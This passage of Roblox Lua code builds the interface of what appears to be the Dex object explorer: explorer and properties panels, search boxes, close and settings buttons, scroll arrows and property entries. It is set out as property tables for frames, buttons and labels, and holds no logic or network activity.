	local DexGui28 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-16,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,16,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="ArrowFrame",Parent = DexGui27})
	local DexGui29 = CreateInstance("TextButton",{Font=3,FontSize=5,Text="",TextColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=true,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,3),Rotation=0,Selectable=true,Size=UDim2.new(1,0,0,8),SizeConstraint=0,Visible=true,ZIndex=1,Name="Up",Parent = DexGui28})
	local DexGui30 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.63921570777893,0.63529413938522,0.64705884456635),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,16,0,8),SizeConstraint=0,Visible=true,ZIndex=1,Name="Arrow",Parent = DexGui29})
	local DexGui31 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.86274510622025,0.86274510622025,0.86274510622025),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,8,0,3),Rotation=0,Selectable=false,Size=UDim2.new(0,1,0,1),SizeConstraint=0,Visible=true,ZIndex=1,Name="Frame",Parent = DexGui30})
	local DexGui32 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.86274510622025,0.86274510622025,0.86274510622025),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,7,0,4),Rotation=0,Selectable=false,Size=UDim2.new(0,3,0,1),SizeConstraint=0,Visible=true,ZIndex=1,Name="Frame",Parent = DexGui30})
	local DexGui33 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.86274510622025,0.86274510622025,0.86274510622025),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,6,0,5),Rotation=0,Selectable=false,Size=UDim2.new(0,5,0,1),SizeConstraint=0,Visible=true,ZIndex=1,Name="Frame",Parent = DexGui30})
	local DexGui34 = CreateInstance("TextButton",{Font=3,FontSize=5,Text="",TextColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=true,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,11),Rotation=0,Selectable=true,Size=UDim2.new(1,0,0,8),SizeConstraint=0,Visible=true,ZIndex=1,Name="Down",Parent = DexGui28})
	local DexGui35 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.63921570777893,0.63529413938522,0.64705884456635),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,16,0,8),SizeConstraint=0,Visible=true,ZIndex=1,Name="Arrow",Parent = DexGui34})
	local DexGui36 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.86274510622025,0.86274510622025,0.86274510622025),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,8,0,5),Rotation=0,Selectable=false,Size=UDim2.new(0,1,0,1),SizeConstraint=0,Visible=true,ZIndex=1,Name="Frame",Parent = DexGui35})
	local DexGui37 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.86274510622025,0.86274510622025,0.86274510622025),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,7,0,4),Rotation=0,Selectable=false,Size=UDim2.new(0,3,0,1),SizeConstraint=0,Visible=true,ZIndex=1,Name="Frame",Parent = DexGui35})
	local DexGui38 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.86274510622025,0.86274510622025,0.86274510622025),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,6,0,3),Rotation=0,Selectable=false,Size=UDim2.new(0,5,0,1),SizeConstraint=0,Visible=true,ZIndex=1,Name="Frame",Parent = DexGui35})
	local DexGui39 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.39215689897537,0.39215689897537,0.39215689897537),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0.5,0),Rotation=0,Selectable=false,Size=UDim2.new(0,300,0.5,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="PropertiesPanel",Parent = DexGui16})
	local DexGui40 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=0,BorderColor3=Color3.new(0.14509804546833,0.20784315466881,0.21176472306252),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,1,0,50),Rotation=0,Selectable=false,Size=UDim2.new(1,-2,1,-50),SizeConstraint=0,Visible=true,ZIndex=1,Name="Content",Parent = DexGui39})
	local DexGui41 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.20784315466881,0.27058824896812,0.27450981736183),BackgroundTransparency=1,BorderColor3=Color3.new(0.14509804546833,0.20784315466881,0.21176472306252),BorderSizePixel=1,ClipsDescendants=true,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,0,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="List",Parent = DexGui40})
	local DexGui42 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.18823531270027,0.18823531270027,0.18823531270027),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,0,0,50),SizeConstraint=0,Visible=true,ZIndex=1,Name="TopBar",Parent = DexGui39})
	local DexGui43 = CreateInstance("TextButton",{Font=4,FontSize=5,Text="X",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=true,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-27,0,0),Rotation=0,Selectable=true,Size=UDim2.new(0,25,0,25),SizeConstraint=0,Visible=true,ZIndex=1,Name="Close",Parent = DexGui42})
	local DexGui44 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Properties",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,25,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-50,0,25),SizeConstraint=0,Visible=true,ZIndex=1,Name="WindowTitle",Parent = DexGui42})
	local DexGui45 = CreateInstance("TextButton",{Font=3,FontSize=5,Text="",TextColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=true,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.21960785984993,0.21960785984993,0.21960785984993),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-25,0,25),Rotation=0,Selectable=true,Size=UDim2.new(0,25,0,25),SizeConstraint=0,Visible=true,ZIndex=1,Name="Settings",Parent = DexGui42})
	local DexGui46 = CreateInstance("ImageLabel",{Image="rbxassetid://530240903",ImageColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,5,0,5),Rotation=0,Selectable=false,Size=UDim2.new(1,-10,1,-10),SizeConstraint=0,Visible=true,ZIndex=1,Name="ImageLabel",Parent = DexGui45})
	local DexGui47 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BackgroundTransparency=0,BorderColor3=Color3.new(0.4588235616684,0.52156865596771,0.52549022436142),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,2,0,45),Rotation=0,Selectable=false,Size=UDim2.new(1,-27,0,2),SizeConstraint=0,Visible=true,ZIndex=1,Name="SearchFrame",Parent = DexGui42})
	local DexGui48 = CreateInstance("TextBox",{ClearTextOnFocus=false,Font=3,FontSize=5,MultiLine=false,Text="",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BackgroundTransparency=1,BorderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,2,0,-20),Rotation=0,Selectable=true,Size=UDim2.new(1,-4,1,20),SizeConstraint=0,Visible=true,ZIndex=1,Name="Search",Parent = DexGui47})
	local DexGui49 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Search Properties",TextColor3=Color3.new(0.37647062540054,0.37647062540054,0.37647062540054),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,0,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Empty",Parent = DexGui48})
	local DexGui50 = CreateInstance("ImageLabel",{Image="rbxassetid://527318112",ImageColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,4,0,-15),Rotation=0,Selectable=false,Size=UDim2.new(0,16,0,16),SizeConstraint=0,Visible=false,ZIndex=1,Name="ImageLabel",Parent = DexGui47})
	local DexGui51 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.13333334028721,0.65490198135376,0.94117653369904),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.5,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,0,0,2),SizeConstraint=0,Visible=true,ZIndex=1,Name="Entering",Parent = DexGui47})
	local DexGui52 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.39215689897537,0.39215689897537,0.39215689897537),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,300,0.5,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="ExplorerPanel",Parent = DexGui16})
	local DexGui53 = CreateInstance("Frame",{Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=0,BorderColor3=Color3.new(0.14509804546833,0.20784315466881,0.21176472306252),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,1,0,50),Rotation=0,Selectable=false,Size=UDim2.new(1,-2,1,-50),SizeConstraint=0,Visible=true,ZIndex=1,Name="Content",Parent = DexGui52})
	local DexGui54 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.20784315466881,0.27058824896812,0.27450981736183),BackgroundTransparency=1,BorderColor3=Color3.new(0.14509804546833,0.20784315466881,0.21176472306252),BorderSizePixel=1,ClipsDescendants=true,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,0,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="List",Parent = DexGui53})
	local DexGui55 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.18823531270027,0.18823531270027,0.18823531270027),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,0,0,50),SizeConstraint=0,Visible=true,ZIndex=1,Name="TopBar",Parent = DexGui52})
	local DexGui56 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BackgroundTransparency=0,BorderColor3=Color3.new(0.4588235616684,0.52156865596771,0.52549022436142),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,2,0,45),Rotation=0,Selectable=false,Size=UDim2.new(1,-27,0,2),SizeConstraint=0,Visible=true,ZIndex=1,Name="SearchFrame",Parent = DexGui55})
	local DexGui57 = CreateInstance("TextBox",{ClearTextOnFocus=false,Font=3,FontSize=5,MultiLine=false,Text="",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BackgroundTransparency=1,BorderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,2,0,-20),Rotation=0,Selectable=true,Size=UDim2.new(1,-4,1,20),SizeConstraint=0,Visible=true,ZIndex=1,Name="Search",Parent = DexGui56})
	local DexGui58 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Search Workspace",TextColor3=Color3.new(0.37647062540054,0.37647062540054,0.37647062540054),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,0,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Empty",Parent = DexGui57})
	local DexGui59 = CreateInstance("ImageLabel",{Image="rbxassetid://527318112",ImageColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,4,0,-15),Rotation=0,Selectable=false,Size=UDim2.new(0,16,0,16),SizeConstraint=0,Visible=false,ZIndex=1,Name="ImageLabel",Parent = DexGui56})
	local DexGui60 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.13333334028721,0.65490198135376,0.94117653369904),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.5,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,0,0,2),SizeConstraint=0,Visible=true,ZIndex=1,Name="Entering",Parent = DexGui56})
	local DexGui61 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Explorer",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,25,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-50,0,25),SizeConstraint=0,Visible=true,ZIndex=1,Name="WindowTitle",Parent = DexGui55})
	local DexGui62 = CreateInstance("TextButton",{Font=3,FontSize=5,Text="",TextColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=true,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.21960785984993,0.21960785984993,0.21960785984993),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-25,0,25),Rotation=0,Selectable=true,Size=UDim2.new(0,25,0,25),SizeConstraint=0,Visible=true,ZIndex=1,Name="Settings",Parent = DexGui55})
	local DexGui63 = CreateInstance("ImageLabel",{Image="rbxassetid://530240903",ImageColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,5,0,5),Rotation=0,Selectable=false,Size=UDim2.new(1,-10,1,-10),SizeConstraint=0,Visible=true,ZIndex=1,Name="ImageLabel",Parent = DexGui62})
	local DexGui64 = CreateInstance("TextButton",{Font=4,FontSize=5,Text="X",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=true,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-27,0,0),Rotation=0,Selectable=true,Size=UDim2.new(0,25,0,25),SizeConstraint=0,Visible=true,ZIndex=1,Name="Close",Parent = DexGui55})
	local DexGui65 = CreateInstance("TextButton",{Font=3,FontSize=5,Text="",TextColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=false,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.28235295414925,0.28235295414925,0.28235295414925),BackgroundTransparency=0,BorderColor3=Color3.new(0.37647062540054,0.37647062540054,0.37647062540054),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,1,0,134),Rotation=0,Selectable=true,Size=UDim2.new(0,300,0,22),SizeConstraint=0,Visible=true,ZIndex=1,Name="PEntry",Parent = DexGui16})
	local DexGui66 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.37647062540054,0.54901963472366,0.82745105028152),BackgroundTransparency=1,BorderColor3=Color3.new(0.33725491166115,0.49019610881805,0.73725491762161),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,18,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-18,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Indent",Parent = DexGui65})
	local DexGui67 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Name",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,2,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-2,0,22),SizeConstraint=0,Visible=true,ZIndex=1,Name="EntryName",Parent = DexGui66})
	local DexGui68 = CreateInstance("TextButton",{Font=3,FontSize=5,Text="",TextColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=true,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=true,Draggable=false,Position=UDim2.new(0,-16,0.5,-8),Rotation=0,Selectable=true,Size=UDim2.new(0,16,0,16),SizeConstraint=0,Visible=false,ZIndex=1,Name="Expand",Parent = DexGui66})
	local DexGui69 = CreateInstance("ImageLabel",{Image="rbxassetid://529659138",ImageColor3=Color3.new(1,1,1),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(-13.6875,0,-12.5625,0),Rotation=0,Selectable=false,Size=UDim2.new(16,0,16,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Icon",Parent = DexGui68})
	local DexGui70 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BackgroundTransparency=1,BorderColor3=Color3.new(0.43921571969986,0.43921571969986,0.43921571969986),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.5,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0.5,0,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Control",Parent = DexGui66})
	local DexGui71 = CreateInstance("TextBox",{ClearTextOnFocus=true,Font=3,FontSize=5,MultiLine=false,Text="0",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,2,0,0),Rotation=0,Selectable=true,Size=UDim2.new(1,-4,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="String",Parent = DexGui70})
	local DexGui72 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.37647062540054,0.37647062540054,0.37647062540054),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.5,-1,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,1,0,22),SizeConstraint=0,Visible=true,ZIndex=1,Name="Sep",Parent = DexGui66})
	local DexGui73 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.5,-250,0.5,-150),Rotation=0,Selectable=false,Size=UDim2.new(0,500,0,300),SizeConstraint=0,Visible=false,ZIndex=1,Name="WelcomeFrame",Parent = DexGui})
